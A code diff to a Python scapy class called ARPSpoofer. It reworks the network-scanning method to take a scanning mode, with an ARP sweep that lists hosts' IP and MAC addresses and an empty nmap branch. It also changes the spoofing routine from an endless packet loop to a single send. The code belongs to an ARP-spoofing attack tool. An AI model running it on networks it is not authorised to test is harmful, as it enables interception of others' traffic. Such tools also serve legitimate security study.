@@ -69,41 +69,43 @@ class ARPSpoofer:
         else:
             raise ScapyNoDstMacException
 
-    def scan_network(self):
-        host_bits = self.get_host_bits(self.subnet_mask)
+    def scan_network(self, scanning_method):
+        if scanning_method == "arp":
+            host_bits = self.get_host_bits(self.subnet_mask)
+            network_ip = self.gateway_ip + "/" + str(host_bits)
+            print(f"Running scan on network address: {network_ip}")
 
-        network_ip = self.gateway_ip + "/" + str(host_bits)
-        print(f"Running scan on network address: {network_ip}")
+            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_ip)
 
-        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_ip)
+            result = srp(arp_request, timeout=3, verbose=False)[0]
+            arp_responses = []
 
-        result = srp(arp_request, timeout=3, verbose=False)[0]
-        arp_responses = []
+            for sent, received in result:
+                # try:
+                #     hostname = socket.gethostbyaddr(received.psrc)[0]
+                # except socket.herror:
+                #     hostname = "Unknown"
+                arp_responses.append(
+                    {
+                        "IP": received.psrc,
+                        "MAC": received.hwsrc,
+                        # 'Hostname': hostname
+                    }
+                )
 
-        for sent, received in result:
-            # try:
-            #     hostname = socket.gethostbyaddr(received.psrc)[0]
-            # except socket.herror:
-            #     hostname = "Unknown"
-            arp_responses.append(
-                {
-                    "IP": received.psrc,
-                    "MAC": received.hwsrc,
-                    # 'Hostname': hostname
-                }
-            )
+            sorted_data = sorted(arp_responses, key=lambda x: x["MAC"])
 
-        sorted_data = sorted(arp_responses, key=lambda x: x["MAC"])
-
-        print("IP\t\tMAC\t\t\tDEVICE")
-        for client in sorted_data:
-            try:
-                mac_resolved = self.mac_resolver[
-                    client["MAC"][:8].replace(":", "-").upper()
-                ]
-            except Exception as e:
-                mac_resolved = ""
-            print(f'{client["IP"]}\t{client["MAC"]}\t{mac_resolved}')
+            print("IP\t\tMAC\t\t\tDEVICE")
+            for client in sorted_data:
+                try:
+                    mac_resolved = self.mac_resolver[
+                        client["MAC"][:8].replace(":", "-").upper()
+                    ]
+                except Exception as e:
+                    mac_resolved = ""
+                print(f'{client["IP"]}\t{client["MAC"]}\t{mac_resolved}')
+        elif scanning_method == 'nmap':
+            pass
 
     def spoof_mac(self, client_ip, spoof_source=False):
 
@@ -117,9 +119,9 @@ class ARPSpoofer:
         packets = self._create_spoofed_packets(client_ip, spoof_source)
         print("Sending packets for spoofing MAC")
 
-        while True:
-            [sendp(x, verbose=False) for x in packets]
-            time.sleep(0.1)
+        # while True:
+        [sendp(x, verbose=False) for x in packets]
+            # time.sleep(0.1)
 
     # def restore_mac(self):
     #     for client in self.spoofed_clients:
